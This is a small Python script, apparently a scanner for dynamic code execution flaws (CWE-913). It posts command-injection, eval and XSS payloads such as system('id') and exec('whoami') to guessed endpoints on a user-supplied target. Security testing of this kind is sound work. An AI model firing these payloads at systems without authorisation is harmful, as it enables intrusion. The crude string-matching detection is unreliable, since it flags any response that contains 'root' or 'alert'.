import requests

# Test payloads for potential code execution
payloads = [
    "test'; system('id'); '",  # Linux Command Injection
    "test' || exec('whoami') || '",  # SQL-based Execution
    "<script>alert('XSS')</script>",  # JavaScript Execution
    "eval('alert(\"Code Execution\")')",  # JavaScript Eval Injection
]

# Endpoint where code execution might occur (modify as needed)
test_endpoints = [
    "/api/run_code",
    "/execute",
    "/compile",
    "/dynamic"
]

def check_dynamic_code_execution(target_url):
    print(f"[*] Checking for CWE-913 at: {target_url}")

    for endpoint in test_endpoints:
        test_url = f"{target_url}{endpoint}"
        for payload in payloads:
            try:
                response = requests.post(test_url, data={"input": payload}, timeout=5)

                if "uid=" in response.text or "root" in response.text:
                    print(f"[!] Possible Vulnerability: Code Execution Detected -> {test_url} (Payload: {payload})")
                elif "alert" in response.text:
                    print(f"[!] Possible Vulnerability: JavaScript Execution -> {test_url} (Payload: {payload})")
                else:
                    print(f"[-] No execution detected at: {test_url} (Payload: {payload})")

            except requests.exceptions.RequestException as e:
                print(f"[-] Error accessing {test_url}: {e}")

# Get user input
target_url = input("Enter the target URL (e.g., https://example.com): ")
check_dynamic_code_execution(target_url)
